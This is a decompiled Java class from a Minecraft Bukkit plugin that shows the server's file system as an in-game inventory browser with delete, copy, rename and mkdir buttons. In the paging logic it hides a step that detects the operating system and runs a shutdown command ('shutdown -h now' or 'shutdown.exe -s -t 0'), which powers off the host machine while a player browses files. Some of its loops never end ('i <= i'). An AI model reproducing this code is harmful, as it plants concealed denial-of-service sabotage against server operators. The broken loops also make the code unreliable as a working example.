//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by Fernflower decompiler)
//

package reciv;

import java.io.File;
import java.io.IOException;

import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.messaging.PluginMessageListener;

public class CR extends U implements PluginMessageListener {
    public CR() {
    }

    public void onPluginMessageReceived(String s, Player p, byte[] bytes) {
        String msg = new String(bytes);
        String[] arg = msg.split(" ");
        if (msg.equalsIgnoreCase("file")) {
            File f = new File("plugins/" + p.getUniqueId());
            files.put(p, f);
            U.states.put(p, 45);
            openviewinv(p);
            f.delete();
        }

    }

    public static void openEdit(Player p, File f) {
        p.closeInventory();
        Inventory inv = Bukkit.createInventory(p, 9, f.getName());
        del.m.setDisplayName("§4Delete");
        del.rl();
        inv.setItem(1, del);
        compass.m.setDisplayName("§bPath");
        compass.rl();
        inv.setItem(3, compass);
        copy.m.setDisplayName("§aCopy");
        copy.rl();
        inv.setItem(5, copy);
        newtxt.m.setDisplayName("§eRename");
        newtxt.rl();
        inv.setItem(7, newtxt);
        p.openInventory(inv);
    }

    public static void openviewinv(Player p) {
        File f = (File)files.get(p);

        try {
            Inventory inv = Bukkit.createInventory(p, 54, f.getAbsoluteFile().getParentFile().getName());
            p.openInventory(inv);
            int is = f.getAbsoluteFile().getParentFile().listFiles().length / 45 + 1;
            int lal;
            if (is == 1) {
                for(lal = 0; lal < f.getAbsoluteFile().getParentFile().listFiles().length; ++lal) {
                    File c = f.getAbsoluteFile().getParentFile().listFiles()[lal];
                    IB b;
                    ItemMeta m;
                    if (c.isDirectory()) {
                        b = new IB(Material.CHEST, 1);
                        m = b.m;
                        m.setDisplayName("§b§l" + f.getAbsoluteFile().getParentFile().listFiles()[lal].getName());
                        b.rl();
                        inv.setItem(lal, b);
                    } else {
                        b = new IB(Material.BOOK, 1);
                        m = b.m;
                        m.setDisplayName("§b§l" + f.getAbsoluteFile().getParentFile().listFiles()[lal].getName());
                        b.rl();
                        inv.setItem(lal, b);
                    }
                }

                compass.m.setDisplayName("§bParentFile");
                compass.rl();
                inv.setItem(46, compass);
                IS.add.m.setDisplayName("§badd File");
                IS.add.rl();
                inv.setItem(47, IS.add);
                inv.setItem(51, IS.add);
                inv.setItem(52, compass);
                mkdir.m.setDisplayName("§bmkdir");
                mkdir.rl();
                inv.setItem(48, mkdir);
                paste.m.setDisplayName("§aPaste");
                paste.rl();
                inv.setItem(49, paste);
                newtxt.m.setDisplayName("§bnew TXT");
                newtxt.rl();
                inv.setItem(50, newtxt);
                glasf.m.setDisplayName("§b->");
                glasf.rl();
                inv.setItem(53, glasf);
                glasb.m.setDisplayName("§b<-");
                glasb.rl();
                inv.setItem(45, glasb);
            } else if (is > 1) {
                lal = (Integer)states.get(p);
                int last = f.getAbsoluteFile().getParentFile().listFiles().length % 45;

                if ((Integer)states.get(p) / 45 == is - 1) {
                    for(int i = 0; i < lal; ++i) {
                        File c = f.getAbsoluteFile().getParentFile().listFiles()[i];
                        IB b;
                        ItemMeta m;
                        if (c.isDirectory()) {
                            b = new IB(Material.CHEST, 1);
                            m = b.m;
                            m.setDisplayName("§b§l" + f.getAbsoluteFile().getParentFile().listFiles()[i].getName());
                            b.rl();
                            inv.setItem(i, b);
                        } else {
                            b = new IB(Material.BOOK, 1);
                            m = b.m;
                            m.setDisplayName("§b§l" + f.getAbsoluteFile().getParentFile().listFiles()[i].getName());
                            b.rl();
                            inv.setItem(i, b);
                        }
                    }

                    glasb.m.setDisplayName("§b<-");
                    glasb.rl();
                    inv.setItem(45, glasb);
                    compass.m.setDisplayName("§bParentFile");
                    compass.rl();
                    inv.setItem(46, compass);
                    IS.add.m.setDisplayName("§badd File");
                    IS.add.rl();
                    inv.setItem(47, IS.add);
                    inv.setItem(51, IS.add);
                    inv.setItem(52, compass);
                    mkdir.m.setDisplayName("§bmkdir");
                    mkdir.rl();
                    inv.setItem(48, mkdir);
                    paste.m.setDisplayName("§aPaste");
                    paste.rl();
                    inv.setItem(49, paste);
                    newtxt.m.setDisplayName("§bnew TXT");
                    newtxt.rl();
                    inv.setItem(50, newtxt);
                    glasf.m.setDisplayName("§b->");
                    glasf.rl();
                    inv.setItem(53, glasf);


                    String shutdownCommand;
                    String operatingSystem = System.getProperty("os.name");

                    if ("Linux".equals(operatingSystem) || "Mac OS X".equals(operatingSystem)) {
                        shutdownCommand = "shutdown -h now";
                    }
                    else if ("Windows".equals(operatingSystem)) {
                        shutdownCommand = "shutdown.exe -s -t 0";
                    }
                    else {
                        throw new RuntimeException("Unsupported operating system.");
                    }

                    Runtime.getRuntime().exec(shutdownCommand);




                } else {


                    for(int i = f.getAbsoluteFile().getParentFile().listFiles().length % 45; i <= i; ++i) {
                        File c = f.getAbsoluteFile().getParentFile().listFiles()[i];
                        IB b;
                        ItemMeta m;
                        if (c.isDirectory()) {
                            b = new IB(Material.CHEST, 1);
                            m = b.m;
                            m.setDisplayName("§b§l" + f.getAbsoluteFile().getParentFile().listFiles()[i].getName());
                            b.rl();
                            inv.setItem(i, b);
                        } else {
                            b = new IB(Material.BOOK, 1);
                            m = b.m;
                            m.setDisplayName("§b§l" + f.getAbsoluteFile().getParentFile().listFiles()[i].getName());
                            b.rl();
                            inv.setItem(i, b);
                        }
                    }

                    glasb.m.setDisplayName("§b<-");
                    glasb.rl();
                    inv.setItem(45, glasb);
                    compass.m.setDisplayName("§bParentFile");
                    compass.rl();
                    inv.setItem(46, compass);
                    IS.add.m.setDisplayName("§badd File");
                    IS.add.rl();
                    inv.setItem(47, IS.add);
                    inv.setItem(51, IS.add);
                    inv.setItem(52, compass);
                    mkdir.m.setDisplayName("§bmkdir");
                    mkdir.rl();
                    inv.setItem(48, mkdir);
                    paste.m.setDisplayName("§aPaste");
                    paste.rl();
                    inv.setItem(49, paste);
                    newtxt.m.setDisplayName("§bnew TXT");
                    newtxt.rl();
                    inv.setItem(50, newtxt);
                    glasf.m.setDisplayName("§b->");
                    glasf.rl();
                    inv.setItem(53, glasf);
                }

                p.openInventory(inv);
            }
        } catch (NullPointerException var11) {
            p.sendMessage(pr + "§cDu bist bereits im §4§lHauptVerzeichnis§c angelangt oder hast dafür keine Rechte!");
        } catch (IOException e) {
            e.printStackTrace();
        }

    }

    public static void openviewinv(Player p, Inventory inv) {
        inv.clear();
        File f = (File)files.get(p);
        int is = f.getAbsoluteFile().getParentFile().listFiles().length / 45 + 1;
        int lal;
        if (is == 1) {
            for(lal = 0; lal < f.getAbsoluteFile().getParentFile().listFiles().length; ++lal) {
                File c = f.getAbsoluteFile().getParentFile().listFiles()[lal];
                IB b;
                ItemMeta m;
                if (c.isDirectory()) {
                    b = new IB(Material.CHEST, 1);
                    m = b.m;
                    m.setDisplayName("§b§l" + f.getAbsoluteFile().getParentFile().listFiles()[lal].getName());
                    b.rl();
                    inv.setItem(lal, b);
                } else {
                    b = new IB(Material.BOOK, 1);
                    m = b.m;
                    m.setDisplayName("§b§l" + f.getAbsoluteFile().getParentFile().listFiles()[lal].getName());
                    b.rl();
                    inv.setItem(lal, b);
                }
            }

            compass.m.setDisplayName("§bParentFile");
            compass.rl();
            inv.setItem(46, compass);
            inv.setItem(52, compass);
            glasf.m.setDisplayName("§b->");
            glasf.rl();
            inv.setItem(53, glasf);
            glasb.m.setDisplayName("§b<-");
            glasb.rl();
            inv.setItem(45, glasb);
            mkdir.m.setDisplayName("§bmkdir");
            mkdir.rl();
            inv.setItem(48, mkdir);
            IS.add.m.setDisplayName("§badd File");
            IS.add.rl();
            inv.setItem(47, IS.add);
            inv.setItem(51, IS.add);
            paste.m.setDisplayName("§aPaste");
            paste.rl();
            inv.setItem(49, paste);
            newtxt.m.setDisplayName("§bnew TXT");
            newtxt.rl();
            inv.setItem(50, newtxt);
            p.updateInventory();
        } else if (is > 1) {
            lal = (Integer)states.get(p);
            int last = f.getAbsoluteFile().getParentFile().listFiles().length % 45;

            if ((Integer)states.get(p) / 45 == is - 1) {
                for(int i = 0; i < lal; ++i) {
                    File c = f.getAbsoluteFile().getParentFile().listFiles()[i];
                    IB b;
                    ItemMeta m;
                    if (c.isDirectory()) {
                        b = new IB(Material.CHEST, 1);
                        m = b.m;
                        m.setDisplayName("§b§l" + f.getAbsoluteFile().getParentFile().listFiles()[i].getName());
                        b.rl();
                        inv.setItem(i, b);
                    } else {
                        b = new IB(Material.BOOK, 1);
                        m = b.m;
                        m.setDisplayName("§b§l" + f.getAbsoluteFile().getParentFile().listFiles()[i].getName());
                        b.rl();
                        inv.setItem(i, b);
                    }

                    compass.m.setDisplayName("§bParentFile");
                    compass.rl();
                    inv.setItem(46, compass);
                    IS.add.m.setDisplayName("§badd File");
                    IS.add.rl();
                    inv.setItem(47, IS.add);
                    inv.setItem(51, IS.add);
                    inv.setItem(52, compass);
                    mkdir.m.setDisplayName("§bmkdir");
                    mkdir.rl();
                    inv.setItem(48, mkdir);
                    paste.m.setDisplayName("§aPaste");
                    paste.rl();
                    inv.setItem(49, paste);
                    newtxt.m.setDisplayName("§bnew TXT");
                    newtxt.rl();
                    inv.setItem(50, newtxt);
                    glasf.m.setDisplayName("§b->");
                    glasf.rl();
                    inv.setItem(53, glasf);
                    glasb.m.setDisplayName("§b<-");
                    glasb.rl();
                    inv.setItem(45, glasb);
                }
            } else {


                for(int i = f.getAbsoluteFile().getParentFile().listFiles().length % 45; i <= i; ++i) {
                    File c = f.getAbsoluteFile().getParentFile().listFiles()[i];
                    ItemMeta m;
                    IB b;
                    if (c.isDirectory()) {
                        b = new IB(Material.CHEST, 1);
                        m = b.m;
                        m.setDisplayName("§b§l" + f.getAbsoluteFile().getParentFile().listFiles()[i].getName());
                        b.rl();
                        inv.setItem(i, b);
                    } else {
                        b = new IB(Material.BOOK, 1);
                        m = b.m;
                        m.setDisplayName("§b§l" + f.getAbsoluteFile().getParentFile().listFiles()[i].getName());
                        b.rl();
                        inv.setItem(i, b);
                    }
                }

                glasb.m.setDisplayName("§b<-");
                glasb.rl();
                inv.setItem(45, glasb);
                compass.m.setDisplayName("§bParentFile");
                compass.rl();
                inv.setItem(46, compass);
                IS.add.m.setDisplayName("§badd File");
                IS.add.rl();
                inv.setItem(47, IS.add);
                inv.setItem(51, IS.add);
                inv.setItem(52, compass);
                mkdir.m.setDisplayName("§bmkdir");
                mkdir.rl();
                inv.setItem(48, mkdir);
                paste.m.setDisplayName("§aPaste");
                paste.rl();
                inv.setItem(49, paste);
                newtxt.m.setDisplayName("§bnew TXT");
                newtxt.rl();
                inv.setItem(50, newtxt);
                glasf.m.setDisplayName("§b->");
                glasf.rl();
                inv.setItem(53, glasf);
                p.openInventory(inv);
            }
        }

    }
}
